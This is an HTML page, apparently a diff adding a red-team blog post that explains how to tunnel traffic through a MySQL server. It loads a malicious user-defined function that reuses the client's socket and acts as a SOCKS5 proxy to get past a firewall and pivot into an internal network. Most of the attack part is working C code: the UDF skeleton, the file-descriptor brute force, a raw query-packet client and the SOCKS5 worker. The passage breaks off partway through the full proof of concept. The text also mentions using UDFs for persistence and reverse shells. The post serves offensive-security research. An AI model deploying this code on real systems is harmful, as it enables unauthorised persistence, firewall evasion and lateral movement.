@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5) | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of how to pivot though the MySQL service. Turning MySQL into a SOCKS5 that can be used by proxychains." />
+<meta property="og:description" content="Description of how to pivot though the MySQL service. Turning MySQL into a SOCKS5 that can be used by proxychains." />
+<link rel="canonical" href="http://localhost:4000/posts/2019/12/06/Pivoting-MySQL-Proxy.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2019/12/06/Pivoting-MySQL-Proxy.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-12-06T14:48:08+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2019-12-06T14:48:08+01:00","datePublished":"2019-12-06T14:48:08+01:00","description":"Description of how to pivot though the MySQL service. Turning MySQL into a SOCKS5 that can be used by proxychains.","headline":"Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2019/12/06/Pivoting-MySQL-Proxy.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2019/12/06/Pivoting-MySQL-Proxy.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>6 December 2019</small>
+<h1>Tunneling traffic through MySQL service (or your mysqld is my new SOCKS5)</h1>
+
+
+<p>        
+When executing a Red Team exercise I like to use UDFs as persistence because it usually does not caught and are easy to trigger in order to pop a shell again. Recently our Red Team had to overcome a situation where the access to a machine was blocked with a network firewall, so only the traffic to the database service was allowed. In this case, our classical UDF that triggers a reverse shell was f*cked because it can not connect back to us because of the firewall. Maybe an option for this kind of situations can be an UDF that does something like <strong>do_system(“my shiny command”)</strong> and shows the output, but that is very uncomfortable.</p>
+
+<p>        
+I liked more the idea of using the same client connection to handle the shell. Even better: we can reuse the client connection to tunnel traffic and use the MySQL service as a proxy, letting us attack other machines in the network. If the firewall only let us to use the MySQL service, let’s use it to pivot and re-conquer the intranet! <strong>:)</strong></p>
+
+<p><strong>Disclaimer:</strong> <em>The code is awful as hell. Read the ideas and implement them as you need, but please do not use this code (it is just a proof of concept). It might cause diseases to you.</em></p>
+
+<h2 id="user-defined-functions-udfs-and-mysql">User-Defined Functions (UDFs) and MySQL</h2>
+<p>        
+The functionalities of MySQL can be expanded with custom functions called <a href="https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html">“User-Defined Functions”</a> or “UDF”. These new functions are implemented in a shared object that will be loaded by MySQL, so they are accesible via traditional querys (<strong>select your_function(‘pwn’);</strong>).</p>
+
+<p>        
+If you are old enough maybe you can remember the <a href="https://www.exploit-db.com/exploits/1518">“Raptor / do_system” exploit</a> which used an UDF to execute commands as root. We can use this code as a skeleton to build our own UDF:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_args</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">arg_count</span><span class="p">;</span>  <span class="c1">// number of arguments</span>
+    <span class="k">enum</span> <span class="n">Item_result</span>    <span class="o">*</span><span class="n">arg_type</span><span class="p">;</span>  <span class="c1">// pointer to item_result</span>
+    <span class="kt">char</span>            <span class="o">**</span><span class="n">args</span><span class="p">;</span>     <span class="c1">// pointer to arguments</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="o">*</span><span class="n">lengths</span><span class="p">;</span>   <span class="c1">// length of string args</span>
+    <span class="kt">char</span>            <span class="o">*</span><span class="n">maybe_null</span><span class="p">;</span>    <span class="c1">// 1 for maybe_null args</span>
+<span class="p">}</span> <span class="n">UDF_ARGS</span><span class="p">;</span>
+ 
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_init</span> <span class="p">{</span>
+    <span class="kt">char</span>            <span class="n">maybe_null</span><span class="p">;</span> <span class="c1">// 1 if func can return NULL</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">decimals</span><span class="p">;</span>   <span class="c1">// for real functions</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">max_length</span><span class="p">;</span> <span class="c1">// for string functions</span>
+    <span class="kt">char</span>            <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>       <span class="c1">// free ptr for func data</span>
+    <span class="kt">char</span>            <span class="n">const_item</span><span class="p">;</span> <span class="c1">// 0 if result is constant</span>
+<span class="p">}</span> <span class="n">UDF_INIT</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">do_carracha</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">is_null</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// Magic &amp; Unicorns</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">char</span> <span class="nf">do_carracha_init</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+Just <code class="language-plaintext highlighter-rouge">gcc -shared -o carracha.so carracha.c -fPIC</code>, move the file to the plugin dir and load the function inside MySQL (<code class="language-plaintext highlighter-rouge">create function do_carracha returns integer soname 'carracha.so';</code>). Let’s move to the interesting things!</p>
+
+<h2 id="in-the-hunt-of-the-sacred-socket">In the hunt of the sacred socket</h2>
+<p>        
+As we said before, our main purpose with this UDF is to reuse the connection made by the client so we can proxy all our TCP traffic through a legitimate connection. If we know what file descriptor is the one used by our connection, we can reuse it easily. Unfortunally, we can not know directly what file descriptor is being used by the connection, so we need to bruteforce them until we find the correct. This is a really old (I mean really really really old) technique used in exploiting that is well described <a href="https://nets.ec/Shellcode/Socket-reuse">in this article from NetSec</a>.</p>
+
+<p>        
+First we need to know what is the range of file descriptors that we need to bruteforce. To do that, we can for example open a new socket and save the file descriptor returned, so this number will be our top limit:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">do_carracha</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">is_null</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="p">...</span>
+	<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+
+	<span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>        
+Once we know the range to be bruteforced we are going to use <a href="http://man7.org/linux/man-pages/man2/getpeername.2.html">getpeername</a> to determine if the file descriptor refers to a valid socket and if the address of the peer connected to the socket is ours.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">fd</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">getpeername</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr_size</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+				<span class="kt">char</span> <span class="n">ip</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
+			
+				<span class="k">if</span> <span class="p">(</span><span class="n">client_addr</span><span class="p">.</span><span class="n">ss_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
+					<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">;</span>
+					<span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ip</span><span class="p">));</span>
+				<span class="p">}</span>
+				<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">client_addr</span><span class="p">.</span><span class="n">ss_family</span> <span class="o">==</span> <span class="n">AF_INET6</span><span class="p">)</span> <span class="p">{</span>
+					<span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">;</span>
+					<span class="n">inet_ntop</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ip</span><span class="p">));</span>
+				<span class="p">}</span>
+
+				<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="s">"X.X.X.X"</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// Hardcoded because it is a PoC. We should take this value from function argument (do_carracha('ip'))</span>
+					<span class="n">write</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="c1">// Say hello to our client!</span>
+					<span class="p">}</span>
+				<span class="p">}</span> 
+		<span class="p">}</span>
+		<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">));</span>
+	<span class="err">}</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>        
+In a few lines we have hunted the sacred socket <strong>:)</strong>. Now let’s move to the client side!</p>
+
+<h2 id="connecting-proxychains-to-the-mysql-service">Connecting proxychains to the MySQL service</h2>
+<p>        
+The easiest way to initiate the communication is using the MySQL C API. We are going to take the sample code from this <a href="http://zetcode.com/db/mysqlc/">tutorial</a> to stablish the connection with the server and then use directly the opened socket to execute the query (<strong>do_carracha(‘whatever’)</strong>) and start the communication:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">proxy_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">){</span>
+	<span class="p">...</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="s">"</span><span class="se">\31\x00\x00\00\x03</span><span class="s">select do_carracha('a');"</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="c1">// Execute query "select do_carracha('a')"</span>
+	<span class="p">...</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">MYSQL</span> <span class="o">*</span><span class="n">con</span> <span class="o">=</span> <span class="n">mysql_init</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="n">con</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mysql_error</span><span class="p">(</span><span class="n">con</span><span class="p">));</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">mysql_real_connect</span><span class="p">(</span><span class="n">con</span><span class="p">,</span> <span class="s">"Y.Y.Y.Y"</span><span class="p">,</span> <span class="s">"username"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mysql_error</span><span class="p">(</span><span class="n">con</span><span class="p">));</span>
+		<span class="n">mysql_close</span><span class="p">(</span><span class="n">con</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="n">proxy_init</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> <span class="c1">// 3 is the socket (0 -&gt; stdin, 1 -&gt; stdout, 2 -&gt; stderr)</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>        
+Our client is going to take care of open a local port and forward messages between proxychains and the MySQL connection, so whatever it receives from proxychains is going to be sent to the server and viceversa. This can be accomplished with selects (check the final PoC).</p>
+
+<p>        
+At this point we have a client to communicate proxychains with the MySQL service and a UDF that will reuse the client’s socket to send/receive messages. The only remaining thing to solve is to implement the SOCKS5 logic in the UDF.</p>
+
+<h2 id="adding-the-socks5-logic-to-the-udf">Adding the SOCKS5 logic to the UDF</h2>
+<p>        
+I do not like the idea of reinveting the wheel, so I am going to reuse this <a href="https://github.com/fgssfgss/socks_proxy">SOCKS5 implementation</a>. Indeed I am going to reuse a slightly edited version that I used in <a href="https://github.com/TarlogicSecurity/mod_ringbuilder">mod_ringbuilder</a> (an Apache backdoor, if you are interested in this topic check <a href="https://www.tarlogic.com/en/blog/backdoors-modulos-apache/">Backdoors in XAMP stack (part III): Apache Modules</a>).</p>
+
+<p>        
+First we are going to fork the process (so we do not block nothing), call the proxy function with the hunted socket as argument in the child process and then close the socket in the parent.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+<span class="kt">void</span> <span class="o">*</span><span class="nf">worker</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">int</span> <span class="n">inet_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">command</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">socks5_invitation</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="n">socks5_auth</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="n">command</span> <span class="o">=</span> <span class="n">socks5_command</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">command</span> <span class="o">==</span> <span class="n">IP</span><span class="p">)</span> <span class="p">{</span>
+		<span class="kt">char</span> <span class="o">*</span><span class="n">ip</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">socks5_ip_read</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">socks5_read_port</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+		<span class="n">inet_fd</span> <span class="o">=</span> <span class="n">app_connect</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ip</span><span class="p">,</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="n">fd</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">inet_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="n">socks5_ip_send_response</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
+		<span class="n">free</span><span class="p">(</span><span class="n">ip</span><span class="p">);</span>
+    <span class="p">}</span> 
+
+	<span class="n">app_socket_pipe</span><span class="p">(</span><span class="n">inet_fd</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">inet_fd</span><span class="p">);</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">proxy</span><span class="p">(</span><span class="kt">int</span> <span class="n">socks</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+	<span class="n">write</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="s">"And this is my Child</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"And this is my Child</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">socks</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">a</span><span class="p">));</span> <span class="c1">// </span>
+	<span class="n">worker</span><span class="p">(</span><span class="n">socks</span><span class="p">);</span>
+	<span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">do_carracha</span><span class="p">(</span><span class="n">UDF_INIT</span> <span class="o">*</span><span class="n">initid</span><span class="p">,</span> <span class="n">UDF_ARGS</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">is_null</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span>
+<span class="p">{</span>
+				<span class="p">...</span>
+				<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="s">"x.x.x.x"</span><span class="p">))</span> <span class="p">{</span>
+					<span class="n">write</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"Now I am become Death</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+					<span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+					<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+						<span class="n">proxy</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+						<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>	
+					<span class="p">}</span>	
+					<span class="k">else</span> <span class="p">{</span>
+						<span class="n">close</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+						<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+					<span class="p">}</span>
+				<span class="p">}</span> 
+				<span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="poc--gtfo">PoC || GTFO</h2>
+<p>        
+Here are the two files used in this PoC (as I said the code sucks a lot, please don’t kill me):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SOCKS5 inside a UDF</span>
+<span class="c1">// Based on https://github.com/fgssfgss/socks_proxy</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;netinet/ip.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/select.h&gt;</span><span class="cp">
+</span>
+
+
+<span class="cp">#define BUFSIZE 65536
+#define IPSIZE 4
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_args</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">arg_count</span><span class="p">;</span>  <span class="c1">// number of arguments</span>
+    <span class="k">enum</span> <span class="n">Item_result</span>    <span class="o">*</span><span class="n">arg_type</span><span class="p">;</span>  <span class="c1">// pointer to item_result</span>
+    <span class="kt">char</span>            <span class="o">**</span><span class="n">args</span><span class="p">;</span>     <span class="c1">// pointer to arguments</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="o">*</span><span class="n">lengths</span><span class="p">;</span>   <span class="c1">// length of string args</span>
+    <span class="kt">char</span>            <span class="o">*</span><span class="n">maybe_null</span><span class="p">;</span>    <span class="c1">// 1 for maybe_null args</span>
+<span class="p">}</span> <span class="n">UDF_ARGS</span><span class="p">;</span>
+ 
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">st_udf_init</span> <span class="p">{</span>
+    <span class="kt">char</span>            <span class="n">maybe_null</span><span class="p">;</span> <span class="c1">// 1 if func can return NULL</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">decimals</span><span class="p">;</span>   <span class="c1">// for real functions</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">max_length</span><span class="p">;</span> <span class="c1">// for string functions</span>
+    <span class="kt">char</span>            <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>       <span class="c1">// free ptr for func data</span>
+    <span class="kt">char</span>            <span class="n">const_item</span><span class="p">;</span> <span class="c1">// 0 if result is constant</span>
+<span class="p">}</span> <span class="n">UDF_INIT</span><span class="p">;</span>
+
+
+
+<span class="k">enum</span> <span class="n">socks</span> <span class="p">{</span>
+	<span class="n">RESERVED</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">,</span>
+	<span class="n">VERSION</span> <span class="o">=</span> <span class="mh">0x05</span>
+<span class="p">};</span>
+
+<span class="k">enum</span> <span class="n">socks_auth_methods</span> <span class="p">{</span>
+	<span class="n">NOAUTH</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">,</span>
+	<span class="n">USERPASS</span> <span class="o">=</span> <span class="mh">0x02</span><span class="p">,</span>
+	<span class="n">NOMETHOD</span> <span class="o">=</span> <span class="mh">0xff</span>
+<span class="p">};</span>
+
+<span class="k">enum</span> <span class="n">socks_auth_userpass</span> <span class="p">{</span>
+	<span class="n">AUTH_OK</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">,</span>
+	<span class="n">AUTH_VERSION</span> <span class="o">=</span> <span class="mh">0x01</span><span class="p">,</span>
+	<span class="n">AUTH_FAIL</span> <span class="o">=</span> <span class="mh">0xff</span>
+<span class="p">};</span>
+
+<span class="k">enum</span> <span class="n">socks_command</span> <span class="p">{</span>
+	<span class="n">CONNECT</span> <span class="o">=</span> <span class="mh">0x01</span>
+<span class="p">};</span>
+
+<span class="k">enum</span> <span class="n">socks_command_type</span> <span class="p">{</span>
+	<span class="n">IP</span> <span class="o">=</span> <span class="mh">0x01</span><span class="p">,</span>
+	<span class="n">DOMAIN</span> <span class="o">=</span> <span class="mh">0x03</span>
+<span class="p">};</span>
+
+<span class="k">enum</span> <span class="n">socks_status</span> <span class="p">{</span>
+	<span class="n">OK</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">,</span>
+	<span class="n">FAILED</span> <span class="o">=</span> <span class="mh">0x05</span>
+<span class="p">};</span>
+
+
+<span class="kt">int</span> <span class="nf">readn</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">nread</span><span class="p">,</span> <span class="n">left</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">left</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">((</span><span class="n">nread</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">left</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">nread</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
